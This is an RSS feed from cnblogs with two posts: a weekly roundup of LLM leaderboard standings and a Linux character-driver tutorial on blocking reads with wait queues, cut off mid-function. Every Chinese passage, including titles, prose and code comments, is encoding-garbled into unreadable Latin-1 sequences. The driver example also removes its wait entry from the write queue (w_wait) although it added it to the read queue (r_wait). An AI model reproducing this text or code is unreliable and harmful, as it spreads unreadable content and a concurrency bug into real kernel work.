<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-02-16T04:22:14.331Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ å¤§æ¨¡åæ¦åå¨æ¥ï¼2026/02/15ï¼ ]]></title>
    <link>https://www.cnblogs.com/xjk15082/p/19619738</link>
    <guid>ec6cc7e1e9f678b743c94cbd12a3803b</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xjk15082/p/19619738" title="åå¸äº 2026-02-16 10:15">
    <span role="heading" aria-level="2">å¤§æ¨¡åæ¦åå¨æ¥ï¼2026/02/15ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="1-æ¬å¨æ¦è§">1. æ¬å¨æ¦è§</h2>
<p>æ¬å¨å¤§æ¨¡åè¡ä¸è¿æ¥å¤é¡¹éè¦åå¸ä¸åçº§ãChatGPTå¯å¨å¹¿åæµè¯ï¼è°·æ­å®£å¸å¯¹Gemini3 Deep Thinkè¿è¡éå¤§åçº§ï¼æ¨åºä¸é¨éå¯¹ç§å­¦ãç ç©¶ä¸å·¥ç¨åºæ¯ç"æ¨çæ¨¡å¼"ãåé®å¢éæ¨è¿Qwen3.5ç³»åæ¨¡ååå¸ï¼å­èæ­£å¼åå¸æ°ä¸ä»£è§é¢åä½æ¨¡åSeedance2.0ãDeepSeekä¸çº¿æ°æ¨¡åï¼ä¸ä¸æçªå£æåè³1M tokensï¼æºè°±ä¸çº¿å¹¶å¼æºGLM-5ï¼MiniMaxä¸çº¿ææ°æè°æ¨¡åM2.5ãOpenRouteræ¦ååºç°éå¤§åå¨ï¼Kimi K2.5ä»ç¬¬3åè·åè³ç¬¬1åï¼ä½¿ç¨éç¿»åå¢é¿125%ï¼Moonshotè¶è¶OpenAIæä¸ºç¬¬ä¸å¤§ååãAnthropicå¨å¤ä¸ªè½åæ¦åä¸­è¡¨ç°å¼ºå²ï¼Claude 4.6åæ½ç¼ç¨è½åæ¦ååä¸¤åï¼Text Arenaæ¦ååæ½å2åã</p>
<h2 id="2-éç¹å³æ³¨äºä»¶">2. éç¹å³æ³¨äºä»¶</h2>
<ul>
<li><strong>ChatGPTå¯å¨å¹¿åæµè¯</strong>ï¼2.10ï¼ï¼OpenAIå¼å§å¨ChatGPTä¸­æµè¯å¹¿ååè½ï¼æ å¿çåä¸åæ¢ç´¢çæ°é¶æ®µã</li>
<li><strong>è°·æ­å®£å¸Gemini 3 Deep Thinkéå¤§åçº§</strong>ï¼2.12ï¼ï¼æ¨åºä¸é¨éå¯¹ç§å­¦ãç ç©¶ä¸å·¥ç¨åºæ¯å¼åç"æ¨çæ¨¡å¼"ï¼æ¨å¨æ¨å¨æºè½åæ²¿åå±ã</li>
<li><strong>åé®å¢éæ¨è¿Qwen 3.5ç³»ååå¸</strong>ï¼2.9ï¼ï¼å·²åHuggingFaceä»£ç åºæäº¤ç¸å³æ¯æPRï¼æ°ç³»åæ¨¡åå³å°é¢ä¸ã</li>
<li><strong>å­èæ­£å¼åå¸Seedance 2.0</strong>ï¼2.12ï¼ï¼æ°ä¸ä»£è§é¢åä½æ¨¡åéç¨ç»ä¸çå¤æ¨¡æé³è§é¢èåçææ¶æï¼æ¯ææå­ãå¾çãé³é¢ãè§é¢åç§æ¨¡æè¾å¥ï¼éæäºç®åä¸çæå¨é¢çå¤æ¨¡æåå®¹åèåç¼è¾è½åã</li>
<li><strong>DeepSeekä¸çº¿æ°æ¨¡å</strong>ï¼2.12ï¼ï¼æ ¸å¿åçº§åæ¬ä¸ä¸æçªå£ä¸éæåè³1M tokensï¼é¿ä¸ä¸æåºæ¯è¡¨ç°çªåºï¼æ´ä½ååºéåº¦ææ¾æåï¼ç¥è¯åºæªæ­¢æ¥ææ¾ç¤ºä¸º2025å¹´5æãæ°æ¨¡åä»ä¸ºçº¯ææ¬æ¨¡åï¼ä¸æ¯æå¤æ¨¡æè¾å¥ãç®åå®æ¹å°æªåå¸æ­£å¼å¬åã</li>
<li><strong>æºè°±ä¸çº¿å¹¶å¼æºGLM-5</strong>ï¼2.12ï¼ï¼å®ä½ä¸ºé¢åå¤æç³»ç»å·¥ç¨åé¿ç¨Agenticä»»å¡çåºåº§æ¨¡åï¼å¨Codingä¸Agentè½åä¸åå¾å¼æºSOTAè¡¨ç°ã</li>
<li><strong>MiniMaxä¸çº¿M2.5æè°æ¨¡å</strong>ï¼2.12ï¼ï¼ææ°æè°æ¨¡åç°å·²å¼æ¾è®¿é®ï¼ç¨æ·å¯éè¿Webç«¯åæ¡é¢ç«¯çMiniMax Agentè°ç¨è¯¥æ¨¡åã</li>
</ul>
<h2 id="3-æ¦ååå">3. æ¦ååå</h2>
<h3 id="openrouteræ¨¡åè°ç¨éæå">OpenRouteræ¨¡åè°ç¨éæå</h3>
<ul>
<li><strong>æ´ä½è°ç¨é</strong>ï¼Kimi K2.5ä»ç¬¬3åè·åè³ç¬¬1åï¼ä½¿ç¨éç¿»åå¢é¿125%ï¼ä»¥1.52T tokensé¥é¥é¢åï¼æ¯ç¬¬2åç2åå¤ãAnthropicä¸¤ä¸ªæ¨¡åæ°å¥ååï¼Claude Opus 4.6å¥æ¦ãTrinity Large Preview (free)ä½ä¸ºåè´¹æ¨¡åå¢é¿81%ãå¦å¤æä¸¤ä¸ªæ¨¡åè·åºååï¼Grok Code Fast 1ï¼ä¸æç¬¬8ï¼åClaude Opus 4.5ï¼ä¸æç¬¬6ï¼è¢«4.6æ¿ä»£ï¼ã</li>
<li><strong>æ¨¡åå¸å ç</strong>ï¼Moonshotè¶è¶OpenAIï¼æä¸ºOpenRouterå¹³å°ç¬¬ä¸å¤§ååï¼ä¸GoogleãAnthropicå¹¶ç«ãGoogleè½ç¶æ»éå¾®å¢ï¼1.58Tâ1.68Tï¼ï¼ä½å¸åºä»½é¢æµå¤±è¿1/6ï¼ä»23%éå°19%ãMiniMaxä»½é¢å¤§å¢1.7%ï¼4.7%â6.4%ï¼ï¼tokensæ¶¨80%ã</li>
<li><strong>æ¨¡åååé</strong>ï¼OpenAI gpt-oss 120Béåº¦æ´æ¶¨29%ï¼447â576 tok/sï¼ï¼æååè¶20Bå°æ¨¡åãMeta 3æ¬¾æ¨¡ååæ¶è¿å¥Top 10ï¼æä¸ºå¥å´æå¤çååï¼Llama 3.3 70Bç´æ¥æ¤æGoogle Gemini 2.5 Flash Liteï¼Llama 4ç³»åï¼Maverick+Scoutï¼åå¥æ¦ã</li>
<li><strong>ç¼ç¨è°ç¨é</strong>ï¼Kimiå¨ç¼ç¨åºæ¯å±ç°ç»æ²»åï¼å¸å ç30.8%ï¼è¿è¶å¶å¨éç¨åºæ¯ç12.6%ä»½é¢ï¼åæ¶é¢åç¬¬äºåè¿20ä¸ªç¾åç¹ãClaude Opus 4.6ç©ºéç¬¬3ï¼æAnthropicæ´ä½ä¸æ»ãä¸æAnthropicåæ¨¡åï¼Opus 4.5 + Sonnet 4.5ï¼åè®¡16.6%ï¼æ¬æAnthropicåæ¨¡åï¼Opus 4.6 + Sonnet 4.5ï¼åè®¡11.3%ã</li>
</ul>
<h3 id="åé¢åè½åæ¦å">åé¢åè½åæ¦å</h3>
<ul>
<li><strong>å¤§è¯­è¨æ¨¡åText Arena</strong>ï¼Anthropicåæ½å2ï¼ç»ç»äºGoogleé¸æ¦ï¼åæ°çªç ´1500åå¤§å³ï¼"thinking"çæ¬é¢ååºç¡ç6åãKimi K2.5-thinkingå¥æ¦ï¼ç¬¬18åï¼1447åï¼ãGLM-5ç¬¬11åï¼1452åï¼ï¼æºè°±æä¸ºæ°çä¸­å½è´¨éä»£è¡¨ã</li>
<li><strong>ç¼ç¨è½åæ¦åï¼Code Arenaï¼</strong>ï¼Claude 4.6é¸æ¦åä¸¤åï¼åæ°çªç ´1560åï¼è¾ä¸æå åï¼1500åï¼æå4.5%ï¼Anthropicåæ½å3ï¼å«4.5-thinking-32kï¼ï¼ä¿æç»å¯¹ç»æ²»ãGoogleæ¨¡åè¢«GPT-5.2-highï¼ç¬¬4ï¼ãGLM-5ï¼ç¬¬6ï¼è¶è¶ãæºè°±GLM-5æä¸ºæ¬ææå¤§é»é©¬ï¼ç´æ¥æå¥å6ï¼åæ°1449åï¼è¶è¶Google Gemini 2.5 Proã</li>
<li><strong>æçå¾è½åæ¦åï¼Artificial Analysis Text to Image Leaderboardï¼</strong>ï¼xAI Grokç©ºéç¬¬5ï¼xAIé¦æ¬¡è¿å¥å¾åçæTop 10ï¼åæ°1190ï¼è¶è¶å­èSeedream 4.0ï¼1189ï¼åFLUX.2 [flex]ï¼1184ï¼ã</li>
<li><strong>çç§è½åæ¦åï¼GPQA LLM Statsï¼</strong>ï¼æ éè¦ååã</li>
<li><strong>åæ²¿æ°å­¦è½åæ¦åï¼EPOCH AI FrontierMathï¼</strong>ï¼Anthropic 4.6ä»£å¨é¢åä»£4.5ä»£ï¼3æ¬¾éç½®å¨é¨è¿å¥Top 5ãGoogle Gemini 3 Pro Previewä¸è·ï¼ä»ç¬¬4è·è³ç¬¬6ã</li>
<li><strong>HLEï¼Human's Last Examï¼</strong>ï¼æ éè¦ååã</li>
</ul>
<h2 id="4-æè¡æ¦">4. æè¡æ¦</h2>
<table>
<thead>
<tr>
<th>æµè¯ç±»å</th>
<th>ç¬¬ä¸å</th>
<th>ç¬¬äºå</th>
<th>ç¬¬ä¸å</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ¨¡åè°ç¨é</td>
<td>Kimi K2.5</td>
<td>Gemini 3 Flash Preview</td>
<td>DeepSeek V3.2</td>
</tr>
<tr>
<td>å¬å¸å¸å ç</td>
<td>Google</td>
<td>Anthropic</td>
<td>MoonShotai</td>
</tr>
<tr>
<td>æ¨¡åéåº¦</td>
<td>gpt-oss-safeguard-20b</td>
<td>Qwen3 32B</td>
<td>gpt-oss-120b</td>
</tr>
<tr>
<td>ç¼ç¨æ¨¡åè°ç¨é</td>
<td>Kimi K2.5</td>
<td>MiniMax M2.1</td>
<td>Claude Opus 4.6</td>
</tr>
</tbody>
</table>
<h3 id="åå¬å¸æä¸åè½åé¢åæåæ±æ»">åå¬å¸æä¸åè½åé¢åæåæ±æ»</h3>
<table>
<thead>
<tr>
<th>æµè¯ç±»å</th>
<th>é¢åå¬å¸</th>
</tr>
</thead>
<tbody>
<tr>
<td>å¤§è¯­è¨æ¨¡å Text Arena</td>
<td>AnthropicãGoogleãxAIãOpenAI</td>
</tr>
<tr>
<td>ç¼ç¨è½å Code Arena</td>
<td>AnthropicãOpenAIãæºè°±ãGoogleãKimi</td>
</tr>
<tr>
<td>ç¼ç¨è½å LiveCodeBench</td>
<td>AnthropicãOpenAIãGoogle</td>
</tr>
<tr>
<td>ä»£ç å·¥ç¨ä»»å¡è½å SWE-bench</td>
<td>AnthropicãGoogleãOpenAI</td>
</tr>
<tr>
<td>å¾åç¼è¾åçæè½å Image Edit Arena</td>
<td>OpenAIãGoogleãxAIãå­èãè¾è®¯</td>
</tr>
<tr>
<td>æçå¾è½å Text-to-Image Arena</td>
<td>OpenAIãGoogleãxAIãBlack Forest Labsãè¾è®¯</td>
</tr>
<tr>
<td>å¾åç¼è¾åçæè½å Image Editing Leaderboard</td>
<td>OpenAIãGoogleãxAIãè¾è®¯ãå­èãBlack Forest Labsãé¿éå·´å·´ãReve</td>
</tr>
<tr>
<td>æçå¾è½å Text to Image Leaderboard</td>
<td>OpenAIãGoogleãBlack Forest LabsãxAIãå­è</td>
</tr>
<tr>
<td>GPQA</td>
<td>OpenAIãGoogleãAnthropicãxAI</td>
</tr>
<tr>
<td>FrontierMath</td>
<td>OpenAIãAnthropicãGoogleãæä¹æé¢ãDeepSeek</td>
</tr>
<tr>
<td>Humanity's Last Exam</td>
<td>GoogleãOpenAIãAnthropic</td>
</tr>
</tbody>
</table>
<hr>
<p>å³æ³¨æï¼ç¬¬ä¸æ¶é´ææ¡æ´å¤AIåæ²¿èµè®¯ï¼</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-16 10:16">2026-02-16 10:15</span>&nbsp;
<a href="https://www.cnblogs.com/xjk15082">KAIæºä¹ </a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19619738);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19619738', targetLink: 'https://www.cnblogs.com/xjk15082/p/19619738', title: 'å¤§æ¨¡åæ¦åå¨æ¥ï¼2026/02/15ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ linuxè®¾å¤é©±å¨é»å¡IOåºç¨ ]]></title>
    <link>https://www.cnblogs.com/cear/p/19617828</link>
    <guid>7a6dff081bb7edb53b6527121ba80b1e</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/cear/p/19617828" title="åå¸äº 2026-02-16 09:51">
    <span role="heading" aria-level="2">linuxè®¾å¤é©±å¨é»å¡IOåºç¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        ä½¿ç¨wait_queue_head_tå®ç°é»å¡ä¸å±åºç¨
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<h2>1. é©±å¨ä¸­é»å¡ç¸å³å½æ°çåºç¡</h2>
<h3>1.1 wait_queue_head_t</h3>
<p>å®ä¹ç­å¾éåå¤´</p>
<div class="cnblogs_code">
<pre>#include &lt;linux/wait.h&gt;
<span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)">
 * lockï¼èªæéï¼ç¨äºä¿æ¤éåæä½ï¼å¦æ·»å /å é¤ç­å¾é¡¹ï¼çå¹¶åå®å¨
 * headï¼é¾è¡¨å¤´ï¼æåç­å¾éåé¡¹çé¾è¡¨
 </span><span style="color: rgba(0, 128, 0, 1)">*/</span><span style="color: rgba(0, 0, 0, 1)">
typedef </span><span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> wait_queue_head {
    spinlock_t      </span><span style="color: rgba(0, 0, 255, 1)">lock</span><span style="color: rgba(0, 0, 0, 1)">;
    </span><span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> list_head    head;
} wait_queue_head_t;</span></pre>
</div>
<h3>1.2 init_waitqueue_head</h3>
<p>åå§åä¸ä¸ªå·²ç»åéäºåå­çç­å¾éåå¤´ï¼è®¾ç½®å¶èªæéåé¾è¡¨ä¸ºç©º</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">void</span> init_waitqueue_head(wait_queue_head_t *q);</pre>
</div>
<h3>1.3 DECLARE_WAITQUEUE</h3>
<p><strong>éæå£°æå¹¶åå§åä¸ä¸ªç­å¾éåé¡¹ï¼wait queue entryï¼</strong>ãè¯¥å®åå»ºä¸ä¸ª&nbsp;<span class="cnblogs_code">wait_queue_entry</span>&nbsp;ç±»åçåéï¼å¹¶å°æå®çè¿ç¨æè¿°ç¬¦&nbsp;<span class="cnblogs_code">tsk</span>&nbsp;ï¼å½åè¿ç¨ä¸º <span class="cnblogs_code">current</span>&nbsp;ï¼ä¸è¯¥éåé¡¹å³èï¼åæ¶è®¾ç½®é»è®¤çå¤éå½æ°</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 0, 1)">DECLARE_WAITQUEUE(name, tsk);

</span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ä½¿ç¨æ¹å¼</span>
<span style="color: rgba(0, 0, 0, 1)">DECLARE_WAITQUEUE(wait, current);
</span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å±å¼åä¸º</span>
wait_queue_entry_t wait =<span style="color: rgba(0, 0, 0, 1)"> {
    .</span><span style="color: rgba(0, 0, 255, 1)">private</span>    = current,                 <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æåç­å¾çè¿ç¨ task_struct</span>
    .func       = default_wake_function,   <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å¤éæ¶è°ç¨çå½æ°</span>
    .task_list  = { NULL, NULL }           <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> é¾è¡¨èç¹ï¼ç¨äºæå¥ç­å¾éåå¤´</span>
};</pre>
</div>
<h3>1.4 add_wait_queue</h3>
<p>å°ä¸ä¸ªå·²ç»åå§åå¥½çç­å¾éåé¡¹&nbsp;<span class="cnblogs_code">wait</span>&nbsp;æ·»å å°ç­å¾éåå¤´&nbsp;<span class="cnblogs_code">queue</span>&nbsp;æç®¡ççéåä¸­ãæ·»å åï¼è¯¥éåé¡¹å°±æä¸ºäºç­å¾éåçä¸é¨å</p>
<p>å¨è¿ç¨åå¤ç¡ç ä¹åï¼åå°èªå·±æ·»å å°ç­å¾éåï¼è¿æ ·å¶ä»å¤éèæè½æ¾å°å®</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">void</span> add_wait_queue(wait_queue_head_t *queue, wait_queue_t *wait);</pre>
</div>
<h3>1.5 set_current_state</h3>
<p class="ds-markdown-paragraph"><strong>è®¾ç½®å½åè¿ç¨çç¶æ</strong>ï¼å°&nbsp;<span class="cnblogs_code">current-&gt;state</span>&nbsp;èµå¼ä¸º&nbsp;<span class="cnblogs_code">new_state</span>&nbsp;<code>ï¼</code>è¿ç¨ç¶æå®ä¹å¨&nbsp;<span class="cnblogs_code">&lt;linux/sched.h&gt;</span>&nbsp;ä¸­ï¼å¸¸è§çæï¼</p>
<ul>
<li>
<p class="ds-markdown-paragraph"><code>TASK_RUNNING</code>ï¼å¯è¿è¡ç¶æï¼æ­£å¨è¿è¡æå°±ç»ªï¼ã</p>
</li>
<li>
<p class="ds-markdown-paragraph"><code>TASK_INTERRUPTIBLE</code>ï¼å¯ä¸­æ­çç¡ç ç¶æï¼å¯ä»¥è¢«ä¿¡å·å¤éã</p>
</li>
<li>
<p class="ds-markdown-paragraph"><code>TASK_UNINTERRUPTIBLE</code>ï¼ä¸å¯ä¸­æ­çç¡ç ç¶æï¼åªè½ç±æ¾å¼å¤éè§£é¤ã</p>
</li>
</ul>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">void</span> set_current_state(<span style="color: rgba(0, 0, 255, 1)">int</span> new_state);        <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æåå­å±éï¼ä¿è¯é¡ºåº</span>
<span style="color: rgba(0, 0, 255, 1)">void</span> __set_current_state(<span style="color: rgba(0, 0, 255, 1)">int</span> new_state);      <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æ²¡æåå­å±é    </span></pre>
</div>
<h3>1.6 <code>remove_wait_queue</code></h3>
<p>å°ä¹åéè¿&nbsp;<span class="cnblogs_code">add_wait_queue</span>&nbsp;æ·»å çç­å¾éåé¡¹ä»ç­å¾éåä¸­ç§»é¤ï¼å½è¿ç¨è¢«å¤éå¹¶éæ°è·å¾ CPU åï¼éå¸¸éè¦è°ç¨æ­¤å½æ°å°èªå·±ä»ç­å¾éåä¸­å é¤ï¼è¡¨ç¤ºä¸åç­å¾è¯¥æ¡ä»¶ï¼å¦æå¿è®°ç§»é¤ï¼éåé¡¹ä»çå¨ç­å¾éåä¸­ï¼å¯è½å¯¼è´åç»­ä¸å¿è¦çå¤éæèµæºæ³æ¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">void</span> remove_wait_queue(wait_queue_head_t *queue, wait_queue_t *wait);</pre>
</div>
<h3>1.7 <code>wake_up</code></h3>
<p>å¤ééåä¸­ææè¿ç¨ï¼åæ¬ <span class="cnblogs_code">TASK_UNINTERRUPTIBLE</span>å&nbsp;<span class="cnblogs_code">TASK_INTERRUPTIBLE</span>&nbsp;ï¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">void</span> wake_up(wait_queue_head_t *queue);</pre>
</div>
<p>å¤éç­å¾éå&nbsp;<span class="cnblogs_code">queue</span>&nbsp;ä¸­ææç¶æä¸º&nbsp;<span class="cnblogs_code">TASK_INTERRUPTIBLE</span>&nbsp;çè¿ç¨ãè¿äºè¿ç¨å°è¢«è®¾ç½®ä¸º&nbsp;<span class="cnblogs_code">TASK_RUNNING</span>&nbsp;å¹¶ç§»å¥è¿è¡éåï¼ç­å¾è°åº¦å¨éæ©å®ä»¬è¿è¡</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">void</span> wake_up_interruptible(wait_queue_head_t *queue);</pre>
</div>
<h2>2. é»å¡é©±å¨ä½¿ç¨ä¾å­</h2>
<div class="cnblogs_code">
<pre>#include &lt;linux/init.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/errno.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/mm.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/sched.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/module.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/ioctl.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/io.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/fs.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/cdev.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/uaccess.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/slab.h&gt;<span style="color: rgba(0, 0, 0, 1)">
#include </span>&lt;linux/wait.h&gt;

<span style="color: rgba(0, 0, 255, 1)">#define</span> GLOBALFIFO_SIZE    1024
<span style="color: rgba(0, 0, 255, 1)">#define</span> GLOBALMEM_MAGIC    'M'
<span style="color: rgba(0, 0, 255, 1)">#define</span> MEM_CLEAR        _IO(GLOBALMEM_MAGIC, 0)

<span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> globalfifo_dev {
    </span><span style="color: rgba(0, 0, 255, 1)">struct</span> cdev m_cdev;            <span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> å­ç¬¦è®¾å¤ </span><span style="color: rgba(0, 128, 0, 1)">*/</span><span style="color: rgba(0, 0, 0, 1)">
    unsigned </span><span style="color: rgba(0, 0, 255, 1)">int</span> current_len;        <span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> fifoæææ°æ®é¿åº¦ </span><span style="color: rgba(0, 128, 0, 1)">*/</span><span style="color: rgba(0, 0, 0, 1)">
    unsigned </span><span style="color: rgba(0, 0, 255, 1)">char</span> mem[GLOBALFIFO_SIZE];    <span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> å¨å±åå­ </span><span style="color: rgba(0, 128, 0, 1)">*/</span>
    <span style="color: rgba(0, 0, 255, 1)">struct</span> semaphore sem;            <span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> å¹¶åæ§å¶ä¿¡å·é </span><span style="color: rgba(0, 128, 0, 1)">*/</span><span style="color: rgba(0, 0, 0, 1)">
    wait_queue_head_t r_wait;        </span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> é»å¡è¯»ç­å¾éåå¤´ </span><span style="color: rgba(0, 128, 0, 1)">*/</span><span style="color: rgba(0, 0, 0, 1)">
    wait_queue_head_t w_wait;        </span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> é»å¡åç­å¾éåå¤´ </span><span style="color: rgba(0, 128, 0, 1)">*/</span><span style="color: rgba(0, 0, 0, 1)">
};


</span><span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">int</span> globalfifo_major = <span style="color: rgba(128, 0, 128, 1)">266</span><span style="color: rgba(0, 0, 0, 1)">;

</span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å­æ¾å­ç¬¦è®¾å¤ç§ææ°æ®</span>
<span style="color: rgba(0, 0, 255, 1)">struct</span> globalfifo_dev*<span style="color: rgba(0, 0, 0, 1)"> globalfifo_devp;


</span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> user open fd </span><span style="color: rgba(0, 128, 0, 1)">*/</span>
<span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">int</span> globalfifo_open(<span style="color: rgba(0, 0, 255, 1)">struct</span> inode* inode, <span style="color: rgba(0, 0, 255, 1)">struct</span> file*<span style="color: rgba(0, 0, 0, 1)"> filp) {
    
    </span><span style="color: rgba(0, 0, 255, 1)">struct</span> globalfifo_dev*<span style="color: rgba(0, 0, 0, 1)"> dev;
    dev </span>= container_of(inode-&gt;i_cdev, <span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> globalfifo_dev, m_cdev);
    filp</span>-&gt;private_data =<span style="color: rgba(0, 0, 0, 1)"> dev;
    </span><span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;
}


</span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> user release fd</span><span style="color: rgba(0, 128, 0, 1)">*/</span>
<span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">int</span> globalfifo_release(<span style="color: rgba(0, 0, 255, 1)">struct</span> inode* inode, <span style="color: rgba(0, 0, 255, 1)">struct</span> file*<span style="color: rgba(0, 0, 0, 1)"> filp) {
    </span><span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;
}



</span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> user read fd </span><span style="color: rgba(0, 128, 0, 1)">*/</span>
<span style="color: rgba(0, 0, 255, 1)">static</span> ssize_t globalfifo_read(<span style="color: rgba(0, 0, 255, 1)">struct</span> file* filp, <span style="color: rgba(0, 0, 255, 1)">char</span> __user* buf, size_t count, loff_t*<span style="color: rgba(0, 0, 0, 1)"> ppos) {
    </span><span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)"> ret;    
    </span><span style="color: rgba(0, 0, 255, 1)">struct</span> globalfifo_dev* dev = filp-&gt;<span style="color: rgba(0, 0, 0, 1)">private_data;    
    
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å®ä¹ç­å¾éå</span>
<span style="color: rgba(0, 0, 0, 1)">    DECLARE_WAITQUEUE(wait, current);    

    down(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 1.å°ç­å¾éåå å¥å°ç­å¾éåå¤´</span>
    add_wait_queue(&amp;dev-&gt;r_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 2.å¾ªç¯æ£æ¥ç­å¾æ¡ä»¶ï¼é²æ­¢åå¤éï¼å¦æå¤éåä¸æ»¡è¶³æ¡ä»¶ä¼åæ¬¡ç¡ç ï¼</span>
    <span style="color: rgba(0, 0, 255, 1)">while</span> (dev-&gt;current_len == <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">) {
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 3. æ£æ¥éé»å¡æ¨¡å¼ç´æ¥è¿å</span>
        <span style="color: rgba(0, 0, 255, 1)">if</span> (filp-&gt;f_flags &amp;<span style="color: rgba(0, 0, 0, 1)"> O_NONBLOCK) {
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EAGAIN;
            up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
            set_current_state(TASK_RUNNING);
            </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
        }
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 4.æ¹åè¿ç¨ç¶æä¸ºå¯ä¸­æ­ç¡ç </span>
